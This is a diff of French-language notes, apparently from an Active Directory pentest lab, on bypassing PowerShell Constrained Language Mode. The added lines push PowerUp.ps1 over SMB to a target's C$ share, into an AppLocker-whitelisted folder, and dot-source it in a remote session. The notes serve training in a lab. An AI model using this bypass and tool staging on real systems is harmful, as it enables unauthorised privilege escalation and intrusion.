@@ -89,9 +89,13 @@ Invoke-Command -Session $s -ScriptBlock {
 > ```
 > → `ConstrainedLanguage` = confirmé.
 >
-> **Bypass 1 — path whitelisté par AppLocker Default Rules** (le plus simple). Dépose le .ps1 dans `C:\Windows\Tasks` (writable admin + whitelisté par défaut) et dot-source depuis là :
+> **⚠ Sous-piège : `Copy-Item -ToSession` est LUI-MÊME bloqué en CLM** (`SessionIsNotInFullLanguageMode`). Il faut push le fichier **via SMB UNC**, en dehors de la PSSession :
 > ```powershell
-> Copy-Item -ToSession $s -Path C:\AD\Tools\PowerUp.ps1 -Destination C:\Windows\Tasks\PowerUp.ps1
+> # depuis student VM (FullLanguage), écrit directement sur C$ de la cible (admin local requis)
+> Copy-Item C:\AD\Tools\PowerUp.ps1 -Destination "\\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\Windows\Tasks\PowerUp.ps1"
+> ```
+> Après SMB push, dot-source dans la PSSession :
+> ```powershell
 > Invoke-Command -Session $s -ScriptBlock {
 >   . C:\Windows\Tasks\PowerUp.ps1                       # dot-source depuis path autorisé
 >   $ExecutionContext.SessionState.LanguageMode          # devrait passer à FullLanguage
